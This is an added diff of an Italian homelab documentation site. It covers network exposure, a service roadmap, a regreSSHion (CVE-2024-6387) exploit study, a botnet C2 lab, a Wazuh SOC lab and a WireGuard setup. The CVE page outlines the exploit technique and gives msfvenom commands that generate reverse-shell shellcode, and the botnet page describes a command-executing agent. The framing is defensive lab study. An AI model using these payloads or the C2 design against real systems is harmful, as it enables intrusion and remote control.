+        <span class="alert-icon">&#9888;</span>
+        <span>Solo WireGuard (51820/UDP) e' esposto intenzionalmente. Tutto il resto e' accessibile solo via VPN o LAN interna.</span>
+      </div>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Porta</th><th>Servizio</th><th>Origine</th><th>Rischio</th><th>Azione</th></tr>
+          <tr><td><code>51820/UDP</code></td><td>WireGuard VPN</td><td>Router -> Proxmox</td><td><span class="badge badge-low">basso</span></td><td>Intenzionale, OK</td></tr>
+          <tr><td><code>53/TCP+UDP</code></td><td>DNS Pi-hole</td><td>Router -> narutoPi</td><td><span class="badge badge-high">alto</span></td><td>Open resolver, DDoS risk &mdash; da chiudere</td></tr>
+          <tr><td><code>8118/TCP</code></td><td>Privoxy proxy</td><td>Router built-in</td><td><span class="badge badge-med">medio</span></td><td>Proxy aperto &mdash; investigare</td></tr>
+          <tr><td><code>80/443/TCP</code></td><td>Admin router</td><td>Router built-in</td><td><span class="badge badge-low">basso</span></td><td>Non disabilitabile</td></tr>
+          <tr><td><code>6699/TCP</code></td><td>TR-069 Vodafone</td><td>Router built-in</td><td><span class="badge badge-low">nessuno</span></td><td>Gestione ISP, normale</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- ======= ROADMAP ======= -->
+    <section class="page" id="roadmap">
+      <h1>Roadmap</h1>
+      <p class="subtitle">Servizi pianificati, in sviluppo e completati.</p>
+
+      <div class="hero-grid" style="margin-bottom:1.5rem">
+        <div class="hero-stat"><span class="val counter" data-target="7" style="color:var(--green)">0</span><div class="lbl">Completati</div></div>
+        <div class="hero-stat"><span class="val counter" data-target="28" style="color:var(--yellow)">0</span><div class="lbl">In progress</div></div>
+        <div class="hero-stat"><span class="val counter" data-target="4" style="color:var(--blue)">0</span><div class="lbl">Planned</div></div>
+      </div>
+
+      <h2>&#128203; Dettaglio</h2>
+      <div class="table-wrap">
+        <table>
+          <tr><th>#</th><th>Area</th><th>Servizio</th><th>Stato</th></tr>
+          <tr><td>1</td><td>Web Server</td><td>Apache/Nginx su VM o LXC</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>1</td><td>Web Server</td><td>Stack LAMP/LEMP</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>2</td><td>Database</td><td>MySQL / PostgreSQL / MongoDB</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>2</td><td>Database</td><td>Replica del database</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>3</td><td>File Server</td><td>Samba, NFS, FTP/SFTP</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>4</td><td>Virtualizzazione</td><td>Proxmox VE</td><td><span class="badge badge-done">done</span></td></tr>
+          <tr><td>4</td><td>Virtualizzazione</td><td>Docker</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>4</td><td>Virtualizzazione</td><td>LXC containers</td><td><span class="badge badge-done">done</span></td></tr>
+          <tr><td>5</td><td>Cloud</td><td>OpenStack</td><td><span class="badge badge-done">done</span></td></tr>
+          <tr><td>5</td><td>Cloud</td><td>MAAS, Juju</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>6</td><td>Rete</td><td>DNS (BIND), DHCP, Proxy (Squid)</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>7</td><td>Mail</td><td>Postfix / Dovecot + SpamAssassin</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>8</td><td>Sicurezza</td><td>Firewall (iptables/ufw)</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>8</td><td>Sicurezza</td><td>IDS (Snort/Suricata)</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>8</td><td>Sicurezza</td><td>Monitoring (Prometheus/Zabbix)</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>9</td><td>Dev</td><td>Git server, CI/CD (Jenkins/GitLab CI)</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>9</td><td>Dev</td><td>Node.js / Rails / Django</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>10</td><td>Media</td><td>Plex / Emby</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>10</td><td>Media</td><td>Nextcloud</td><td><span class="badge badge-wip">wip</span></td></tr>
+          <tr><td>11</td><td>Backup</td><td>rsync + cron</td><td><span class="badge badge-done">done</span></td></tr>
+          <tr><td>11</td><td>Backup</td><td>Bacula</td><td><span class="badge badge-done">done</span></td></tr>
+          <tr><td>12</td><td>Automazione</td><td>Ansible</td><td><span class="badge badge-done">done</span></td></tr>
+          <tr><td>12</td><td>Automazione</td><td>Shell scripting</td><td><span class="badge badge-done">done</span></td></tr>
+          <tr><td>13</td><td>VPN</td><td>WireGuard / OpenVPN</td><td><span class="badge badge-done">done</span></td></tr>
+          <tr><td>14</td><td>Game Server</td><td>Minecraft / Counter-Strike</td><td><span class="badge badge-plan">planned</span></td></tr>
+          <tr><td>15</td><td>AI / ML</td><td>TensorFlow / PyTorch</td><td><span class="badge badge-plan">planned</span></td></tr>
+          <tr><td>16</td><td>IoT</td><td>MQTT Broker</td><td><span class="badge badge-plan">planned</span></td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- ======= POC LAB ======= -->
+    <section class="page" id="poc">
+      <h1>PoC Lab</h1>
+      <p class="subtitle">Proof of Concept in ambiente isolato su Proxmox VE &mdash; ricerca e studio educativo.</p>
+
+      <div class="alert alert-info">
+        <span class="alert-icon">&#128161;</span>
+        <span>Tutte le attivita' sono condotte esclusivamente su macchine virtuali di proprieta' dell'autore, in ambiente home lab isolato (Proxmox VE, rete LAN privata). Nessun sistema esterno coinvolto. Scopo: formazione e ricerca sulla sicurezza informatica.</span>
+      </div>
+
+      <h2>&#128203; Indice</h2>
+      <div class="table-wrap">
+        <table>
+          <tr><th>#</th><th>CVE / Lab</th><th>Tipo</th><th>Target</th><th>Stato</th></tr>
+          <tr>
+            <td>1</td>
+            <td><a onclick="show('cve-regres')" style="color:var(--blue);cursor:pointer;font-weight:500">CVE-2024-6387 regreSSHion</a></td>
+            <td>Race condition &rarr; RCE non autenticato</td>
+            <td>Ubuntu 22.04 x64, Debian 12 i386</td>
+            <td><span class="badge badge-wip">documentato, RCE non riprodotto</span></td>
+          </tr>
+          <tr>
+            <td>2</td>
+            <td>CVE-2006-5051</td>
+            <td>Signal handler OpenSSH (pam_start)</td>
+            <td>Ubuntu 6.06 i386</td>
+            <td><span class="badge badge-plan">planned</span></td>
+          </tr>
+          <tr>
+            <td>3</td>
+            <td><a onclick="show('botnet')" style="color:var(--blue);cursor:pointer;font-weight:500">Botnet lab from scratch</a></td>
+            <td>C2 + agent Python</td>
+            <td>Ubuntu, Debian, LXC</td>
+            <td><span class="badge badge-wip">in progress</span></td>
+          </tr>
+          <tr>
+            <td>4</td>
+            <td>CVE-2016-4450: nginx DoS</td>
+            <td>Proxmox, k3s, botnet, HTTP/1.1</td>
+            <td>LAN</td>
+            <td><span class="badge badge-plan">planned</span></td>
+          </tr>
+          <tr>
+            <td>5</td>
+            <td>linpeas privesc Arch Linux</td>
+            <td>Privilege escalation</td>
+            <td>Arch Linux LXC</td>
+            <td><span class="badge badge-wip">in progress</span></td>
+          </tr>
+        </table>
+      </div>
+
+      <h2>&#128193; Struttura tipica</h2>
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre>poc/&lt;nome-poc&gt;/
+  README.md        &lt;-- overview, obiettivo, risultati
+  STATUS.md        &lt;-- stato aggiornato
+  STUDY.md         &lt;-- note di studio tecnico
+  attempts/        &lt;-- tentativi per vittima/architettura
+    &lt;target&gt;/
+      notes.md     &lt;-- log, errori, osservazioni
+      scripts/     &lt;-- scanner, exploit, strumenti
+  scripts/         &lt;-- strumenti generali del PoC</pre>
+      </div>
+    </section>
+
+    <!-- ======= CVE-2024-6387 ======= -->
+    <section class="page" id="cve-regres">
+      <h1>CVE-2024-6387</h1>
+      <p class="subtitle">regreSSHion &mdash; Race condition RCE non autenticato su OpenSSH &mdash; CVSS 8.1 (High)</p>
+
+      <div class="toc">
+        <div class="toc-title">In questa pagina</div>
+        <ul class="toc-list">
+          <li><a onclick="scrollH('cve-bg')">Background: storia della regressione</a></li>
+          <li><a onclick="scrollH('cve-cause')">Causa tecnica</a></li>
+          <li><a onclick="scrollH('cve-versions')">Versioni affette</a></li>
+          <li><a onclick="scrollH('cve-how')">Come funziona l'exploit</a></li>
+          <li><a onclick="scrollH('cve-ingredients')">I tre ingredienti</a></li>
+          <li><a onclick="scrollH('cve-results')">Risultati tentativi</a></li>
+          <li><a onclick="scrollH('cve-why')">Perche' non e' stato riprodotto</a></li>
+          <li><a onclick="scrollH('cve-mitigate')">Mitigazioni</a></li>
+        </ul>
+      </div>
+
+      <div class="alert alert-warn">
+        <span class="alert-icon">&#9888;</span>
+        <span>CVSS 8.1 (High) &bull; Scoperto da Qualys, luglio 2024 &bull; ~14 milioni server vulnerabili esposti su internet al momento del disclosure &bull; Attivita' in lab: 2026-03-27/28</span>
+      </div>
+
+      <h2 id="cve-bg">&#128336; Background: storia della regressione</h2>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Anno</th><th>Evento</th></tr>
+          <tr><td>2006</td><td>CVE-2006-5051 scoperto e fixato in OpenSSH 4.4p1</td></tr>
+          <tr><td>2020</td><td>Un aggiornamento OpenSSH rimuove accidentalmente il fix</td></tr>
+          <tr><td>2024 luglio</td><td>Qualys lo riscopre e pubblica come CVE-2024-6387 <em>regreSSHion</em></td></tr>
+        </table>
+      </div>
+
+      <h2 id="cve-cause">&#128256; Causa tecnica</h2>
+      <p><code>syslog()</code> viene chiamata dall'interno del signal handler <code>SIGALRM</code>. Le funzioni in un signal handler devono essere <strong>async-signal-safe</strong>: <code>syslog()</code> non lo e' perche' internamente chiama <code>malloc()</code>/<code>free()</code>, che non sono rientranti.</p>
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre><span class="sh-cmt"># Versione vulnerabile (8.5p1 - 9.7p1)</span>
+LoginGraceTime scade <span class="sh-kw">-></span> SIGALRM <span class="sh-kw">-></span> handler <span class="sh-kw">-></span> syslog() <span class="sh-kw">-></span> malloc()
+                                                              <span class="sh-val">^</span>
+                                                   <span class="sh-cmt">Non rientrante: PERICOLOSO</span>
+
+<span class="sh-cmt"># Versione patchata (>= 9.8p1)</span>
+LoginGraceTime scade <span class="sh-kw">-></span> SIGALRM <span class="sh-kw">-></span> handler <span class="sh-kw">-></span> <span class="sh-str">(solo operazioni async-signal-safe)</span></pre>
+      </div>
+
+      <h2 id="cve-versions">&#128203; Versioni affette</h2>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Versione OpenSSH</th><th>Stato</th><th>Note</th></tr>
+          <tr><td>&lt; 4.4p1</td><td><span class="badge badge-high">vulnerabile</span></td><td>CVE originale 2006</td></tr>
+          <tr><td>4.4p1 &ndash; 8.4p1</td><td><span class="badge badge-done">non vulnerabile</span></td><td>Fix CVE-2006-5051 presente</td></tr>
+          <tr><td>8.5p1 &ndash; 9.7p1</td><td><span class="badge badge-high">vulnerabile</span></td><td>Fix rimosso per regressione</td></tr>
+          <tr><td>&ge; 9.8p1</td><td><span class="badge badge-done">non vulnerabile</span></td><td>Fix reintrodotto</td></tr>
+          <tr><td>Ubuntu 22.04 Jammy</td><td><span class="badge badge-done">patchato</span></td><td><code>1:8.9p1-3ubuntu0.10</code></td></tr>
+          <tr><td>Debian 12</td><td><span class="badge badge-done">patchato</span></td><td><code>1:9.2p1-2+deb12u3</code></td></tr>
+        </table>
+      </div>
+
+      <h2 id="cve-how">&#128256; Come funziona l'exploit</h2>
+      <p>L'idea e' <strong>controintuitiva</strong>: invece di autenticarsi il prima possibile, si resta connessi in silenzio per quasi 120 secondi, poi si triggera il crash nel momento esatto in cui sshd riceve <code>SIGALRM</code>.</p>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Tempo</th><th>Attaccante</th><th>sshd (vittima)</th></tr>
+          <tr><td><code>t=0s</code></td><td>Apre la connessione TCP. Non manda credenziali.</td><td>Avvia countdown <code>LoginGraceTime</code> 120s</td></tr>
+          <tr><td><code>t=0-119s</code></td><td>Invia pacchetti crafted per riempire la heap (heap grooming)</td><td>Aspetta autenticazione, processa i pacchetti</td></tr>
+          <tr><td><code>t=119.978s</code></td><td>Manda il pacchetto finale &mdash; trattiene l'ultimo byte</td><td>Sta ancora aspettando</td></tr>
+          <tr><td><code>t=119.979s</code></td><td>Manda l'ultimo byte: <code>malloc()</code> dentro sshd parte</td><td><code>malloc()</code> inizia ad allocare</td></tr>
+          <tr><td><code>t=120.000s</code></td><td>Ha gia' fatto tutto</td><td>SIGALRM scatta, interrompe <code>malloc()</code> a meta'. <code>syslog()</code> chiama <code>malloc()</code> su heap corrotta: trova lo shellcode, lo esegue come <strong>root</strong></td></tr>
+        </table>
+      </div>
+
+      <h2 id="cve-ingredients">&#128295; I tre ingredienti</h2>
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-title">1. Heap grooming</div>
+          <div class="card-body">Si mandano pacchetti di dimensioni precise per creare coppie di chunk alternati (large ~4-8KB + small ~300B) nella heap di sshd. I chunk piccoli diventano posizioni candidate per la fake FILE struct.</div>
+        </div>
+        <div class="card">
+          <div class="card-title">2. Fake FILE struct</div>
+          <div class="card-body">glibc usa strutture <code>FILE</code> con vtable di puntatori a funzione. Si costruisce una struttura falsa con offset precisi verso glibc per fare in modo che <code>malloc()</code> corrotta chiami il codice dello shellcode.</div>
+        </div>
+        <div class="card">
+          <div class="card-title">3. Timing preciso (~1ms)</div>
+          <div class="card-body">Il pacchetto finale viene mandato in due parti: tutto tranne l'ultimo byte, poi l'ultimo byte ~1ms prima di SIGALRM. Il server sta processando il pacchetto proprio quando il segnale scatta.</div>
+        </div>
+      </div>
+
+      <h3>Shellcode</h3>
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre><span class="sh-cmt"># x86 (32-bit) - reverse shell TCP</span>
+<span class="sh-cmd">msfvenom</span> <span class="sh-flag">-p</span> linux/x86/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=<span class="sh-val">4444</span> <span class="sh-flag">-f</span> c <span class="sh-flag">-b</span> <span class="sh-str">"\x00"</span>
+
+<span class="sh-cmt"># x86_64 (64-bit)</span>
+<span class="sh-cmd">msfvenom</span> <span class="sh-flag">-p</span> linux/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=<span class="sh-val">4444</span> <span class="sh-flag">-f</span> c <span class="sh-flag">-b</span> <span class="sh-str">"\x00"</span></pre>
+      </div>
+
+      <h2 id="cve-results">&#128202; Risultati tentativi</h2>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Script</th><th>Architettura</th><th>Handshake</th><th>SIGALRM</th><th>Risultato</th></tr>
+          <tr><td><code>exploit.py</code></td><td>64-bit Ubuntu</td><td>raw ✗</td><td>&mdash;</td><td>kex_protocol_error</td></tr>
+          <tr><td><code>exploit-v2.py</code></td><td>32-bit Debian</td><td>paramiko ✓</td><td>&mdash;</td><td>Bad packet length</td></tr>
+          <tr><td><code>exploit-v3.py</code></td><td>32-bit Debian</td><td>paramiko ✓</td><td>OK ✓</td><td><strong>SIGALRM OK, no RCE</strong></td></tr>
+          <tr><td><code>7etsuo-regreSSHion.c</code></td><td>32-bit Debian</td><td>raw ✗</td><td>&mdash;</td><td>padding error</td></tr>
+        </table>
+      </div>
+
+      <h2 id="cve-why">&#128269; Perche' non e' stato riprodotto</h2>
+
+      <h3>Problema 1: offset _IO_codecvt</h3>
+      <p><code>_IO_codecvt</code> viene allocato sull'heap da <code>fwide()</code> a runtime: non ha offset fisso dentro glibc. Il valore degli exploit pubblici e' un placeholder errato, verificato su glibc 2.35 (Ubuntu 22.04) e glibc 2.36 (Debian 12). Qualys non punta a una struttura statica: costruisce la heap tramite grooming in modo che <code>_codecvt</code> punti a memoria controllata dall'attaccante. Il codice Qualys funzionante non e' mai stato pubblicato (a marzo 2026, quasi 2 anni dopo il disclosure di luglio 2024).</p>
+
+      <h3>Problema 2: ASLR su sistemi moderni</h3>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Sistema</th><th>Candidati glibc</th><th>Probabilita' per tentativo</th><th>Media tentativi</th></tr>
+          <tr><td>Ubuntu 6.06 (2007)</td><td>2</td><td>50%</td><td>2-4 (secondi)</td></tr>
+          <tr><td>Debian 12 moderno</td><td>~3.072</td><td>0.03%</td><td>~4 giorni medi</td></tr>
+          <tr><td>Ubuntu 22.04 64-bit</td><td>~32.768</td><td>~0.003%</td><td>~10 ore (senza IDS)</td></tr>
+        </table>
+      </div>
+
+      <h2 id="cve-mitigate">&#128737; Mitigazioni</h2>
+      <div class="alert alert-ok">
+        <span class="alert-icon">&#9989;</span>
+        <span>Fix definitivo: aggiornare OpenSSH a &ge; 9.8p1 o alla versione patchata della propria distro. La patch rimuove <code>syslog()</code> dal signal handler e usa solo operazioni async-signal-safe.</span>
+      </div>
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre><span class="sh-cmt"># Mitigazione immediata (senza aggiornare OpenSSH)</span>
+<span class="sh-cmt"># Elimina la finestra di race: senza LoginGraceTime SIGALRM non scatta mai</span>
+<span class="sh-cmd">echo</span> <span class="sh-str">"LoginGraceTime 0"</span> >> /etc/ssh/sshd_config
+<span class="sh-cmd">systemctl</span> restart ssh
+
+<span class="sh-cmt"># Limita connessioni non autenticate simultanee</span>
+<span class="sh-cmd">echo</span> <span class="sh-str">"MaxStartups 10:30:10"</span> >> /etc/ssh/sshd_config</pre>
+      </div>
+      <ul class="checklist">
+        <li class="done"><span class="ck">✓</span> Aggiornare OpenSSH a &ge; 9.8p1 (fix definitivo)</li>
+        <li class="done"><span class="ck">✓</span> <code>LoginGraceTime 0</code> elimina la finestra di race</li>
+        <li class="done"><span class="ck">✓</span> fail2ban con backend systemd: blocca dopo 5-10 tentativi</li>
+        <li class="done"><span class="ck">✓</span> Rate limiting firewall + <code>MaxStartups 10:30:10</code></li>
+        <li class="todo"><span class="ck">○</span> IDS/SIEM alert su pattern di connessioni anomale</li>
+      </ul>
+    </section>
+
+    <!-- ======= BOTNET LAB ======= -->
+    <section class="page" id="botnet">
+      <h1>Botnet Lab from Scratch</h1>
+      <p class="subtitle">Costruzione di un sistema C2 + agent in Python da zero, in rete LAN isolata.</p>
+
+      <div class="alert alert-info">
+        <span class="alert-icon">&#128161;</span>
+        <span>Lab completamente isolato su rete LAN privata Proxmox. Nessuna connessione internet. Scopo: comprendere il funzionamento interno di una botnet per difesa, detection e studio delle tecniche di C2.</span>
+      </div>
+
+      <h2>&#127919; Obiettivo</h2>
+      <p>Costruire da zero un sistema Command &amp; Control (C2) con agent Python per capire come funziona internamente una botnet: architettura, protocolli di comunicazione, propagazione, e rilevamento con IDS/SIEM.</p>
+
+      <h2>&#128295; Componenti del lab</h2>
+      <div class="card-grid">
+        <div class="card"><div class="card-title">C2 Server</div><div class="card-body">Controller centrale. Riceve connessioni dagli agent, invia comandi, raccoglie output. Implementato in Python con HTTP o TCP.</div></div>
+        <div class="card"><div class="card-title">Agent (bot)</div><div class="card-body">Script deployato sulle vittime. Si connette al C2 tramite polling HTTP o TCP. Esegue comandi ricevuti e invia l'output.</div></div>
+        <div class="card"><div class="card-title">Propagazione</div><div class="card-body">Meccanismo di diffusione studiato: SSH brute force, exploit, file condivisi. Documentato in <code>analysis/propagation.md</code>.</div></div>
+        <div class="card"><div class="card-title">Detection</div><div class="card-body">Rilevamento tramite Wazuh SIEM e Suricata IDS. Studio delle signature e anomalie generate dal traffico C2 su LAN.</div></div>
+      </div>
+
+      <h2>&#128506; Architettura C2</h2>
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre>[C2 Server - controller]
+        ^
+        | HTTP polling / reverse TCP (outbound)
+        |
+[Agent 1]  [Agent 2]  [Agent 3]
+(Ubuntu)   (Debian)   (LXC CT)
+
+Comunicazione outbound dal bot -> C2
+  -> aggira firewall ingress
+  -> simula traffico user normale</pre>
+      </div>
+
+      <h2>&#9989; Stato</h2>
+      <ul class="checklist">
+        <li class="done"><span class="ck">✓</span> Architettura C2 base definita</li>
+        <li class="done"><span class="ck">✓</span> Agent Python: connessione TCP al C2, esecuzione comandi remoti</li>
+        <li class="done"><span class="ck">✓</span> Analisi propagazione documentata (<code>analysis/propagation.md</code>)</li>
+        <li class="done"><span class="ck">✓</span> HTTP polling studiato (<code>analysis/http-polling.md</code>)</li>
+        <li class="wip"><span class="ck">~</span> Rilevamento Wazuh sul traffico C2 in corso</li>
+        <li class="todo"><span class="ck">○</span> Signatures Suricata per C2 traffic</li>
+        <li class="todo"><span class="ck">○</span> Tecniche di evasion (studio difensivo)</li>
+        <li class="todo"><span class="ck">○</span> Dashboard C2 con lista agent connessi</li>
+      </ul>
+    </section>
+
+    <!-- ======= SOC / SIEM ======= -->
+    <section class="page" id="soc">
+      <h1>SOC / SIEM Lab</h1>
+      <p class="subtitle">Build Your Own SOC &mdash; Wazuh + Suricata in ambiente Proxmox isolato.</p>
+
+      <h2>&#128187; Macchine del lab</h2>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Nome</th><th>Tipo</th><th>OS</th><th>Ruolo</th><th>IP</th></tr>
+          <tr><td><code>cs20</code></td><td>VM</td><td>Kali Linux 2025.4</td><td>Attacker - Red Team</td><td>192.168.1.21</td></tr>
+          <tr><td><code>cs33</code></td><td>Container LXC</td><td>Ubuntu</td><td>Victim - Wazuh Agent</td><td>&mdash;</td></tr>
+          <tr><td><code>cs55</code></td><td>VM</td><td>Ubuntu</td><td>Wazuh Manager + Dashboard + Indexer</td><td>&mdash;</td></tr>
+          <tr><td><code>cs42</code></td><td>VM</td><td>Ubuntu</td><td>SOC alternativo (Wazuh all-in-one)</td><td>192.168.1.5</td></tr>
+        </table>
+      </div>
+
+      <h2>&#128506; Architettura</h2>
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre>[cs20 - Kali - Red Team]
+    |
+    | SSH brute force / nmap / exploit / CVE
+    v
+[cs33 - Ubuntu - Wazuh Agent]
+    |
+    | logs TCP 1514
+    v
+[cs55 - Wazuh Manager + Dashboard + Indexer]
+    |
+    | visualize / alert
+    v
+[SOC Analyst - you]</pre>
+      </div>
+
+      <h2>&#128268; Porte Wazuh</h2>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Porta</th><th>Servizio</th><th>Uso</th><th>Esposizione</th></tr>
+          <tr><td><code>443</code></td><td>Wazuh Dashboard</td><td>Web UI SIEM (HTTPS)</td><td>LAN</td></tr>
+          <tr><td><code>1514</code></td><td>Wazuh remoted</td><td>Ricezione log dagli agent</td><td>LAN</td></tr>
+          <tr><td><code>1515</code></td><td>Wazuh authd</td><td>Registrazione nuovi agent</td><td>LAN</td></tr>
+          <tr><td><code>55000</code></td><td>Wazuh Manager API</td><td>REST API management</td><td>LAN</td></tr>
+          <tr><td><code>9200</code></td><td>Wazuh Indexer (OpenSearch)</td><td>Backend search</td><td>localhost only</td></tr>
+        </table>
+      </div>
+
+      <h3>Startup sequence (ordine obbligatorio)</h3>
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre><span class="sh-cmt"># 1. cs55: avvia nell'ordine corretto</span>
+<span class="sh-cmd">systemctl</span> start wazuh-indexer
+<span class="sh-cmd">systemctl</span> start wazuh-manager
+<span class="sh-cmd">systemctl</span> start wazuh-dashboard
+
+<span class="sh-cmt"># 2. cs33: avvia l'agent</span>
+<span class="sh-cmd">systemctl</span> start wazuh-agent
+
+<span class="sh-cmt"># Tutti i servizi sono abilitati all'avvio automatico</span>
+<span class="sh-cmd">systemctl</span> enable wazuh-indexer wazuh-manager wazuh-dashboard</pre>
+      </div>
+
+      <h2>&#9989; Checklist</h2>
+      <ul class="checklist">
+        <li class="done"><span class="ck">✓</span> cs55: Wazuh Manager + Dashboard + Indexer (all-in-one script)</li>
+        <li class="done"><span class="ck">✓</span> cs33: Wazuh Agent installato e connesso a cs55</li>
+        <li class="done"><span class="ck">✓</span> cs20: primo attacco SSH brute force Hydra + nmap scan</li>
+        <li class="done"><span class="ck">✓</span> Alert verificati sulla Wazuh Dashboard</li>
+        <li class="done"><span class="ck">✓</span> cs42: Wazuh all-in-one (indexer heap ridotto a 512 MB)</li>
+        <li class="wip"><span class="ck">~</span> Suricata IDS su cs42 in configurazione</li>
+        <li class="todo"><span class="ck">○</span> Honeypot Cowrie in LXC container</li>
+        <li class="todo"><span class="ck">○</span> Alert rules custom per botnet C2 traffic</li>
+        <li class="todo"><span class="ck">○</span> Correlazione eventi Suricata + Wazuh</li>
+      </ul>
+    </section>
+
+    <!-- ======= VPN SETUP ======= -->
+    <section class="page" id="vpn">
+      <h1>VPN Setup</h1>
+      <p class="subtitle">WireGuard + PiVPN + No-IP DDNS &mdash; accesso remoto cifrato al homelab.</p>
+
+      <h2>&#128506; Architettura</h2>
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre>[MacBook / Client remoto]
+        |
+        | tunnel WireGuard cifrato (UDP 51820)
+        |
+    [Internet]
+        |
+[Router casa] ---- Port forwarding 51820/UDP ----> Proxmox
+                                                        |
+                                             [wg0] 10.x.x.1/24
+                                                        |
+                                          [Rete VPN 10.x.x.0/24]</pre>
+      </div>
+
+      <h2>&#128295; Componenti</h2>
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-title">&#128274; WireGuard</div>
+          <div class="card-body">Protocollo VPN a chiave pubblica/privata. Interfaccia <code>wg0</code>, porta <code>51820</code> UDP. IP server nella VPN: <code>10.x.x.1</code>, MacBook: <code>10.x.x.2</code>.</div>
+        </div>
+        <div class="card">
+          <div class="card-title">&#128736; PiVPN</div>
+          <div class="card-body">Script che gestisce WireGuard senza configurare chiavi a mano. Genera QR code per smartphone. Config in <code>/etc/pivpn/wireguard/</code>.</div>
+        </div>
+        <div class="card">
+          <div class="card-title">&#127760; No-IP DDNS</div>
+          <div class="card-body">L'IP del router e' dinamico (ISP Vodafone). No-IP mantiene un hostname fisso aggiornato. Piano gratuito: conferma ogni 30 giorni via email.</div>
+        </div>
+      </div>
+
+      <h2>&#128273; Chiavi WireGuard</h2>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Chiave</th><th>Scopo</th><th>Posizione</th></tr>
+          <tr><td>Private key</td><td>Decifra il traffico ricevuto</td><td><code>/etc/wireguard/wg0.conf</code></td></tr>
+          <tr><td>Public key</td><td>Il peer la usa per cifrare verso di te</td><td>Condivisa con i peer</td></tr>
+          <tr><td>Preshared key</td><td>Layer extra di sicurezza simmetrica (opzionale)</td><td><code>/etc/wireguard/configs/</code></td></tr>
+        </table>
+      </div>
+
+      <h2>&#128257; Split tunnel vs Full tunnel</h2>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Modalita'</th><th>AllowedIPs</th><th>Comportamento</th><th>Uso attuale</th></tr>
+          <tr><td>Split tunnel</td><td><code>10.x.x.0/24</code></td><td>Solo traffico verso la VPN nel tunnel. Internet normale.</td><td><span class="badge badge-done">attivo</span></td></tr>
+          <tr><td>Full tunnel</td><td><code>0.0.0.0/0</code></td><td>Tutto il traffico nel tunnel. Richiede NAT su Proxmox.</td><td>Non usato</td></tr>
+        </table>
+      </div>
+
+      <h2>&#9881; Comandi PiVPN</h2>
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre><span class="sh-cmd">pivpn</span> add          <span class="sh-cmt"># aggiunge un nuovo client (peer)</span>
+<span class="sh-cmd">pivpn</span> <span class="sh-flag">-l</span>           <span class="sh-cmt"># lista client attivi con last handshake</span>
+<span class="sh-cmd">pivpn</span> <span class="sh-flag">-r</span>           <span class="sh-cmt"># rimuove un client</span>
+<span class="sh-cmd">pivpn</span> <span class="sh-flag">-qr</span>          <span class="sh-cmt"># QR code per connettere smartphone</span>
+<span class="sh-cmd">pivpn</span> <span class="sh-flag">-d</span>           <span class="sh-cmt"># debug connessione</span>
+<span class="sh-cmd">wg</span> show            <span class="sh-cmt"># stato interfaccia e handshake attivi</span></pre>
+      </div>
+
+      <div class="alert alert-warn">
+        <span class="alert-icon">&#9888;</span>
+        <span>Non usare NAT Statico sul router: manderebbe tutto il traffico in entrata verso Proxmox, rompendo la connettivita' degli altri dispositivi LAN.</span>
+      </div>
+    </section>
+
+    <!-- ======= INCIDENTI ======= -->
+    <section class="page" id="incidents">
+      <h1>Incidenti &amp; Case Studies</h1>
+      <p class="subtitle">Attacchi reali rilevati e analizzati sul homelab.</p>
+
+      <h2>&#128680; SSH Brute Force &mdash; 2026-03-24</h2>
+      <div class="alert alert-ok">
+        <span class="alert-icon">&#9989;</span>
+        <span>Severity: Low &bull; Esito: <strong>Attacco fallito</strong> &bull; Host: dimanet Proxmox VE 8.2</span>
+      </div>
+
+      <h3>Come e' stato rilevato</h3>
+      <p>Durante l'esecuzione manuale di <code>proxmox_health_check.sh</code> il report ha mostrato login SSH falliti con username <code>sol</code>, <code>solana</code>, <code>solv</code>.</p>
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre><span class="sh-cmt"># Verifica accessi accettati</span>
